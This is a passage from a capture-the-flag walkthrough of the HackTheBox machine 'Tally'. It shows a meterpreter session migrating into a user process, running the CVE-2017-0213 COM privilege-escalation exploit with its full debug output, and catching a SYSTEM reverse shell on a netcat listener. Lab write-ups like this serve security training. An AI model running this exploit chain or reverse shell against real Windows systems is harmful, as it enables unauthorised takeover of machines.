 2372   676    RuntimeBroker.exe           x64   1        TALLY\Sarah                   C:\Windows\System32\RuntimeBroker.exe
 2512   920    sihost.exe                  x64   1        TALLY\Sarah                   C:\Windows\System32\sihost.exe
 2720   584    svchost.exe                 x64   1        TALLY\Sarah                   C:\Windows\System32\svchost.exe
 3080   676    WmiPrvSE.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 3592   584    dllhost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
 3728   584    sqlservr.exe                x64   0        TALLY\Sarah                   C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
 3736   584    sqlceip.exe                 x64   0        NT SERVICE\SQLTELEMETRY       C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\Binn\sqlceip.exe
 3844   584    msdtc.exe                   x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 4112   4976   SPUCWorkerProcessProxy.exe  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\UserCode\SPUCWorkerProcessProxy.exe
 4232   7104   cmd.exe                     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 4320   4284   explorer.exe                x64   1        TALLY\Sarah                   C:\Windows\explorer.exe
 4436   1684   w3wp.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\inetsrv\w3wp.exe
 4476   12120  cscript.exe                 x86   0        TALLY\Sarah                   C:\Windows\SysWOW64\cscript.exe
 4776   1684   w3wp.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\inetsrv\w3wp.exe
 4808   584    mssearch.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows SharePoint Services\15.0\Bin\mssearch.exe
 4856   676    ShellExperienceHost.exe     x64   1        TALLY\Sarah                   C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4976   584    SPUCHostService.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\UserCode\SPUCHostService.exe
 4992   676    SearchUI.exe                x64   1        TALLY\Sarah                   C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 5344   1684   w3wp.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\inetsrv\w3wp.exe
 5360   4320   vmtoolsd.exe                x64   1        TALLY\Sarah                   C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 5408   4320   cmd.exe                     x64   1        TALLY\Sarah                   C:\Windows\System32\cmd.exe
 5416   5408   conhost.exe                 x64   1        TALLY\Sarah                   C:\Windows\System32\conhost.exe
 6640   1684   w3wp.exe                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\w3wp.exe
 7104   3016   ebowlashell9004.exe         x64   0        NT AUTHORITY\SYSTEM           C:\FTP\Intranet\myexecshell.exe
 7456   4976   SPUCWorkerProcess.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\UserCode\SPUCWorkerProcess.exe
 7948   4112   conhost.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\conhost.exe
 8260   584    svchost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 8756   11648  conhost.exe                 x64   0        TALLY\Administrator           C:\Windows\System32\conhost.exe
 8832   560    powershell.exe              x86   0        TALLY\Administrator           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 8980   7104   conhost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 9220   5408   firefox.exe                 x86   1        TALLY\Sarah                   C:\Program Files (x86)\Mozilla Firefox\firefox.exe
 9236   1684   w3wp.exe                    x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\inetsrv\w3wp.exe
 9596   4476   HwWJbEJIMe.exe              x86   0        TALLY\Sarah                   C:\Users\Sarah\AppData\Local\Temp\rad81215.tmp\HwWJbEJIMe.exe
 10256  5408   PING.EXE                    x64   1        TALLY\Sarah                   C:\Windows\System32\PING.EXE
 10580  1684   w3wp.exe                    x64   0        IIS APPPOOL\Mockups           C:\Windows\System32\inetsrv\w3wp.exe
 11216  11648  powershell.exe              x64   0        TALLY\Administrator           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 11648  920    powershell.exe              x64   0        TALLY\Administrator           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 11884  4476   conhost.exe                 x64   0        TALLY\Sarah                   C:\Windows\System32\conhost.exe

meterpreter > migrate 4320
[*] Migrating to 4320
[*] Migration completed successfully.
meterpreter >
meterpreter > shell
Process 6576 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
tally\sarah

C:\Windows\system32>cd C:\Users\Sarah
cd C:\Users\Sarah

C:\Users\Sarah>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\Users\Sarah

01/06/2018  07:58    <DIR>          .
01/06/2018  07:58    <DIR>          ..
01/06/2018  07:58             1,224 AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
31/08/2017  22:57    <DIR>          Contacts
01/06/2018  07:37           169,472 CVE-2017-0213.exe
29/05/2018  09:45    <DIR>          Desktop
13/10/2017  21:38    <DIR>          Documents
01/10/2017  20:34    <DIR>          Downloads
31/08/2017  22:57    <DIR>          Favorites
31/08/2017  22:57    <DIR>          Links
31/08/2017  22:57    <DIR>          Music
01/06/2018  00:31         2,873,282 myexecshell.exe
01/06/2018  07:58             1,336 output.tlb
31/08/2017  22:57    <DIR>          Pictures
01/06/2018  07:58               328 run.sct
31/08/2017  22:57    <DIR>          Saved Games
31/08/2017  22:57    <DIR>          Searches
31/08/2017  22:57    <DIR>          Videos
01/06/2018  07:58    <DIR>          Windows
               5 File(s)      3,045,642 bytes
              14 Dir(s)   2,548,199,424 bytes free

C:\Users\Sarah>CVE-2017-0213.exe
CVE-2017-0213.exe
Building Library with path: script:C:\Users\Sarah\run.sct
Found TLB name at offset 766
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001B5C7D90010
Queried Success: 000001B5C7D90010
AddRef: 1
QI - Marshaller: {0000001B-0000-0000-C000-000000000046} 000001B5C7D90010
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001B5C7D90010
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 000001B5C7D90010
Queried Success: 000001B5C7D90010
AddRef: 2
QI - Marshaller: {00000018-0000-0000-C000-000000000046} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {00000040-0000-0000-C000-000000000046} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001B5C7D90010
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D90010
QI - Marshaller: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001B5C7D90010
QI - Marshaller: {00000019-0000-0000-C000-000000000046} 000001B5C7D90010
QI - Marshaller: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001B5C7D90010
Release: 3
Opened Link \??\C: -> \Device\HarddiskVolume1\Users\Sarah: 0000000000000198
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001B5C7D90390
Queried Success: 000001B5C7D90390
AddRef: 1
Release: 2
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001B5C7D90390
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001B5C7D90390
Queried Success: 000001B5C7D90390
AddRef: 1
Marshal Interface: {00000000-0000-0000-C000-000000000046}
AddRef: 2
AddRef: 3
Release: 4
Marshal Complete: 00000000
Release: 2
AddRef: 3
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 000001B5C7D90010
Queried Success: 000001B5C7D90010
AddRef: 4
Marshal Interface: {659CDEAC-489E-11D9-A9CD-000D56965251}
Setting bad IID
Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 000001B5C7D8FDF0
Unknown IID: {00000003-0000-0000-C000-000000000046} 000001B5C7D8FDF0
Unknown IID: {0000001B-0000-0000-C000-000000000046} 000001B5C7D8FDF0
Query for IUnknown
Unknown IID: {00000018-0000-0000-C000-000000000046} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {00000040-0000-0000-C000-000000000046} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {03FB5C57-D534-45F5-A1F4-D39556983875} 000001B5C7D8FDF0
Unknown IID: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 000001B5C7D8FDF0
Unknown IID: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 000001B5C7D8FDF0
Unknown IID: {00000019-0000-0000-C000-000000000046} 000001B5C7D8FDF0
Unknown IID: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 000001B5C7D8FDF0
Query for ITMediaControl
Marshal Complete: 00000000
Release: 5
Release: 4
AddRef: 3
Release: 4
Release: 3
Result: 80029C4A
Done
Release: 1
Release object 000001B5C7D90390
Release: 2

C:\Users\Sarah>
```

```sh
root@kali:~/tally# nc -nlvp 9004
listening on [any] 9004 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.59] 53877
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

###### Reference

- [HackTheBox - Tally](https://www.youtube.com/watch?v=l-wzBhc9wFc)